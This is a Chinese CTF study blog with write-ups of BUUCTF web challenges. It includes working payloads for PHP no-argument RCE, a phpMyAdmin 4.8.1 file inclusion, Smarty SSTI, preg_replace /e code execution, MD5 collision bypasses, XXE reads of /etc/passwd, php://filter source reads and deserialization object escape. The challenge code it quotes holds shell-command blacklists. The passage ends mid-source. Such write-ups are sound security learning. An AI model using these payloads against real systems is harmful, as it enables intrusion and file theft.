sky&#39;s blog (skysec.top)关于无参数rce 首先要读取目录内容， 可以用print_r(scandir(&#39;.&#39;)); 但是因为不能传参，所以要想把.用函数代替 这里有两个函数可以利用 localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. current() 返回数组中的当前单元, 默认取第一个值 所以current(localeconv())永远是个. 也就可以用print_r(scandir(current(localeconv())));来读目录 可以看到flag就在flag.php中 现在要想办法把它读出来 这里可以利用array_reverse()和next函数 通过array_reverse() 函数返回翻转顺序的数组。（反转之后flag.php被放在第二个数组之中）next() 函数将内部指针指向数组中的下一个元素，并输出。payload为： ？exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 也可以利用 array_flip()交换数组的键和值 array_rand()从数组中随机取出一个或多个单元 最后再利用readfile函数读出文件或者用show_source让它高亮显示 由于array_rand是随机的，所以要多刷新几次才可能会显示flag.php的内容 [GWCTF 2019]我有一个数据库御剑是真的不好用。。。phpmyadmin路径死活扫不出来 这里phpmyadmin版本是4.8.1 由于phpmyadmin4.8.0-4.8.1存在文件包含漏洞 直接用payload打 ?target=db_datadict.php%253f/../../../../../../../../flag [BJDCTF2020]The mystery of ip这道题第一眼看上去像是本地访问的题目 但是hint有感觉不太像 抓包修改xff头后就没思路了，查了一下发现是smarty模板注入 看到这里支持逻辑运算，可以直接解析，所以就可以利用系统命令来读flag Smarty SSTI利用 (1条消息) PHP的模板注入（Smarty模板）_WHOAMIAnony的博客-CSDN博客_smarty模板注入 Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。 漏洞确认 一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 常规利用方式 Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 {literal} 标签 &#123;literal&#125;可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。 若该题环境为php5，则可以 &lt;script&gt;language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt; 静态方法 通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。 在3.1.30的Smarty版本中官方已经把该静态方法删除 {if}标签官方文档中看到这样的描述： Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if} [BJDCTF2020]ZJCTF，不过如此第一部分 可以用伪协议读取，但是不知道为什么我用hackbar时没成功 也可以用这个payload text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php base64解码 当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。 深入研究preg_replace与代码执行 - 先知社区 (aliyun.com) 这里第二个参数固定为strtolower(&quot;\\\\1&quot;)这里的\\\\1实际上体现为\\1 \\1 在正则表达式中有自己的含义: 反向引用对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问 这里的\\1指的是第一个匹配项 这里我们就要利用这个漏洞来运行getflag函数，并同时给cmd传参，利用system来执行命令 为了实现运行getflag的目的，就要先让\\1为getflag(),也就是传入 .*={${getFlag()}} 原先的语句： preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;, $value); 变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;); 这样通过preg_replace后就会运行getflag函数，但是由于php特性.传入后会变为_所以这里要利用正则匹配中的\\S 所以传入的payload为\\S*={${getFlag()}} \\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配 最终payload为?\\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;); [BJDCTF2020]Mark loves cat整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。 接一下百度的wp的源码 index.php &lt;?php include &#39;flag.php&#39;; $yds &#x3D; &quot;dog&quot;; $is &#x3D; &quot;cat&quot;; $handsome &#x3D; &#39;yds&#39;; foreach($_POST as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $$y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($handsome); &#125; &#125; if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123; exit($yds); &#125; if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39; || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($is); &#125; echo &quot;the flag is: &quot;.$flag; flag.php &lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;); 前两个foreach语句分别将POST参数和GET参数进行变量覆盖，接着是三个if语句，exit()函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。 首先我们想到的是让脚本执行到最后一句echo $flag;，但即使绕过三个if语句，我们GET传参或者POST传参的flag总会被变量覆盖：如我们GET传参flag=aaa，在第二个foreach语句中变成$flag = $aaa，而$aaa变量没有定义为空，最后的输出就是空 但是由于变量覆盖的原因最终不会显示flag 而exit()函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将exit()函数内的参数用$flag覆盖掉就能输出flag了； 所以我们可以借助后两个if语句中的exit来输出flag 当我们get yds=flag时，满足第二个if判断，而由于第一个foreach语句，$yds=$flag，所以最终就会变成exit($flag); 还可以借助第三个if语句，当我们get flag=flag&amp;is=flag后经过第二个foreach语句$flag=$flag，$is=$flag对flag自身无影响，又因为满足第三个if语句，也会输出flag值 BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_Zero_Adam的博客-CSDN博客 BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客 [安洵杯 2019]easy_web进入后看到img参数像base64，解码两次再用16进制转字符串会变成555.png 所以为了想读取源码，我们将index.php按照相同的方式加密后变为 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 修改后替换img原来的值，发现依旧返回了一大串base64编码，解码后可获得源码 重点： if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;; &#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &#96;$cmd&#96;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125; &#125; 先看第二个if里的md5的比较，传数组或者传md5值为0e开头的都没法绕过去 (1条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初 · mochu7-CSDN博客 MD5碰撞的一些例子 - 简书 (jianshu.com) 从这两篇文章里能找到存在文件十六进制字节流数据的哈希值相等 再考虑到要将一些不可见字符传到服务器，这里可以使用url编码 最终 a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 这里要绕过两个if语句，然后执行cmd中的参数，所以可以利用反斜杠绕过，在正则表达式中三个反斜杠才能匹配到反斜杠， (1条消息) 【PHP】之4个反斜杠、3个反斜杠的情况_Hertter的博客-CSDN博客 为什么3反斜杠在php中等于4反斜杠？ - Thinbug 题目里的正则其实有些问题，所以虽然存在了四个反斜杠但是依旧没有过滤掉反斜杠 贴个大佬的文章 从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com) 可以先用dir查看目录 ca\\t%20/flag来绕过第一个if 用\\的原因是因为在linux下行尾输\\可以换行并且继续输入命令 这里正则匹配漏了uniq和sort，用这俩也能拿到flag [网鼎杯 2020 朱雀组]phpweb先抓包 发现有两个post的参数 然后根据报错的信息 这里用了call_user_func函数，也就是func是函数名，p是参数 用system试时发现被过滤了，发现file_get_contents函数可以用 file_get_contents拿源码 &lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 由于这个过滤不存在与test中，所以可以利用反序列化来执行命令 利用find命令来查找文件名中有flag的文件 最后用file_get_contents来查看文件 [NCTF2019]Fake XML cookbook看到这题目第一眼就感觉是xxe漏洞，正好趁这个机会把xml学一下 从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com) NCTF2019]Fake XML cookbook_sgnbi~的博客-CSDN博客 浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户 - XML被设计为传输和存储数据，其焦点是数据的内容。 - HTML被设计用来显示数据，其焦点是数据的外观。 基本语法： - 所有 XML 元素都须有关闭标签。 - XML 标签对大小写敏感。 - XML 必须正确地嵌套。 - XML 文档必须有根元素。 - XML 的属性值须加引号。 - 实体引用，如果你把字符 &quot;&lt;&quot; 放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误： &lt;bookstore> &lt;!--根元素--> &lt;book category=\"COOKING\"> &lt;!--bookstore的子元素，category为属性--> &lt;title>Everyday Italian&lt;/title> &lt;!--book的子元素，lang为属性--> &lt;author>Giada De Laurentiis&lt;/author> &lt;!--book的子元素--> &lt;year>2005&lt;/year> &lt;!--book的子元素--> &lt;price>30.00&lt;/price> &lt;!--book的子元素--> &lt;/book> &lt;!--book的结束--> &lt;/bookstore> &lt;!--bookstore的结束--> DTD 文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例 &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt; ]&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;&#x2F;to&gt; &lt;from&gt;@re&lt;&#x2F;from&gt; &lt;head&gt;v3ry&lt;&#x2F;head&gt; &lt;body&gt;g00d!&lt;&#x2F;body&gt; &lt;&#x2F;note&gt; 当使用外部DTD时，通过如下语法引入。 &lt;!DOCTYPE root-element SYSTEM \"filename\"> 外部DTD实例 &lt;?xml version=\"1.0\"?> &lt;!DOCTYPE root-element SYSTEM \"test.dtd\"> &lt;note> &lt;to>Y0u&lt;/to> &lt;from>@re&lt;/from> &lt;head>v3ry&lt;/head> &lt;body>g00d!&lt;/body> &lt;/note> test.dtd： &lt;!ELEMENT to (#PCDATA)>&lt;!--定义to元素为”#PCDATA”类型--> &lt;!ELEMENT from (#PCDATA)>&lt;!--定义from元素为”#PCDATA”类型--> &lt;!ELEMENT head (#PCDATA)>&lt;!--定义head元素为”#PCDATA”类型--> &lt;!ELEMENT body (#PCDATA)>&lt;!--定义body元素为”#PCDATA”类型--> PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。 内部实体示例代码 &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt; ]&gt; &lt;test&gt;&amp;writer;©right;&lt;&#x2F;test&gt; 外部实体示例代码 &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt; ]&gt; &lt;author&gt;&amp;file;©right;&lt;&#x2F;author&gt; XXE漏洞简介 XXE漏洞全称XML External Entity Injection 即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 通过各种协议可以实现xxe注入，例如利用file://来访问本地文件系统 解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。simplexml_load_string()可以读取XML 简单的payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;xml&gt; &lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt; &lt;&#x2F;xml&gt; &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; 题解： 抓包，能看出是用xml进行传输数据 直接上payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; [BSidesCF 2020]Had a bad day看这个url，试试伪协议读取 多了个php 所以可以用这个来读源码?category=php://filter/read=convert.base64-encode/resource=index base64解码后的重点 &lt;?php $file &#x3D; $_GET[&#39;category&#39;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#39;.php&#39;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; 存在flag.php页面，之后就是想办法把他读出来 接下来有一个 php伪协议嵌套的知识点 PHP伪协议可以将某个文件或文件夹包含在php://filter/convert.base64-encode/resource=flag中。比如：php://filter/convert.base64-encode/index/resource=flag 这样就能绕过if的判断，读取flag文件 [ASIS 2019]Unicorn shop 输入id和价格，应该是购买独角兽，而且price只允许输入一位数，前三个买的时候都显示 但是因为price的输入限制，所以我猜这里应该是要想办法购买第四个独角兽 这里要利用Unicode的编码，查找一个大于1337的字符 https://www.compart.com/en/unicode/ 比如这个 成功拿到flag [BJDCTF2020]Cookie is so stable 看一眼hint flag页面的登录框 这里存在ssti注入 可以试出来是twig模板，根据提示注入点应该在cookie里，抓包 通过修改user内容实现注入 一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍 [De1CTF 2019]SSRF Me题目源码 #! &#x2F;usr&#x2F;bin&#x2F;env python # #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(&#39;latin1&#39;) app &#x3D; Flask(__name__) secert_key &#x3D; os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action &#x3D; action self.param &#x3D; param self.sign &#x3D; sign self.sandbox &#x3D; md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result &#x3D; &#123;&#125; result[&#39;code&#39;] &#x3D; 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;) resp &#x3D; scan(self.param) if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;): result[&#39;data&#39;] &#x3D; resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] &#x3D; 200 if &quot;read&quot; in self.action: f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] &#x3D; 200 result[&#39;data&#39;] &#x3D; f.read() if result[&#39;code&#39;] &#x3D;&#x3D; 500: result[&#39;data&#39;] &#x3D; &quot;Action Error&quot; else: result[&#39;code&#39;] &#x3D; 500 result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): return True else: return False @app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) def geneSign(): param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action &#x3D; &quot;scan&quot; return getSign(action, param) @app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def challenge(): action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;)) param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip &#x3D; request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task &#x3D; Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#39;&#x2F;&#39;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.debug &#x3D; False app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999) Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag 1：&#x2F;geneSign：获得url中parma参数，通过getSign(action, param)生成摘要 2：&#x2F;De1ta：获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回 3：&#x2F;：返回源码 三个函数 def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False getSign：返回secert_key + param + action的哈希值md5：waf：禁止了flie和gopher协议 task类 class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#39;code&#39;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#39;data&#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] = 200 result[&#39;data&#39;] = f.read() if result[&#39;code&#39;] == 500: result[&#39;data&#39;] = &quot;Action Error&quot; else: result[&#39;code&#39;] = 500 result[&#39;msg&#39;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False checkSign：检查cookie中的signExec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容 hint提示flag在flag.txt 中，想要读到他首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中然后：action=read，将result.txt的内容读出 绕过点：signcheckSign会检查cookie中的sign==getSign（param，action）两个困难点：secert_key的值未知 思路：先进入/De1ta中的challenge函数，在Exec中的scan部分中将flag.txt的内容存入result.txt，然后从read部分中将其存到result字典中读出，再以json形式返回到客户端，我们就能得到flag。 写入与读出部分 而如果action中既有scan,又有read,那么就会依次执行scan和read 而为了绕过这个验证，就要利用 让param = flag.txtread 因为action为scan 所以得到的md5值为keyflag.txtreadscan 满足action=readscan param=flag.txt时的值 解题 ​ 首先进入genesign页面得到md5(keyflag.txtreadscan)的值作为sign 在到de1ta界面抓包get进param=flag.php，在cookie内加入sign和action [安洵杯 2019]easy_serialize_php代码审计 &lt;?php $function &#x3D; @$_GET[&#39;f&#39;]; function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img); &#125; if($_SESSION)&#123; unset($_SESSION); &#125; $_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;; $_SESSION[&#39;function&#39;] &#x3D; $function; extract($_POST); if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;; &#125; if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;); &#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;])); &#125; $serialize_info &#x3D; filter(serialize($_SESSION)); if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;); &#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here! &#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); &#125; phpinfo里有东西，可以先看看 接下来我们应该开始想怎么让 base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名 知识点 反序列化中的对象逃逸 extract()变量覆盖 extract()变量覆盖 但是这里我们不能直接给img赋值，因为img赋值发生在extract之后 反序列化中的对象逃逸 键值逃逸 因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。 并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号&#123;&#125;外的就都被扔掉。 接下来是构造payload的部分 首先我们需要构造img属性： s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; 其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如： ;s:1:“1”;;s:2:“10”;;s:3:“100”; 所以payload可以为： _SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7 为7的原因 但是添加了filter函数来进行过滤之后 原来的内容变为了 a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; 能成功实现读取flag所在文件的命令 post后 对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn 所以直接把原来的编码替换掉就行 看是看懂了，但我还是想不到这种payload。。。 参考文章 安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客 https://www.cnblogs.com/h3zh1/p/12732336.html [CISCN 2019 初赛]Love Math源码 &lt;?php error_reporting(0); &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__); &#125;else&#123; &#x2F;&#x2F;例子 c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, 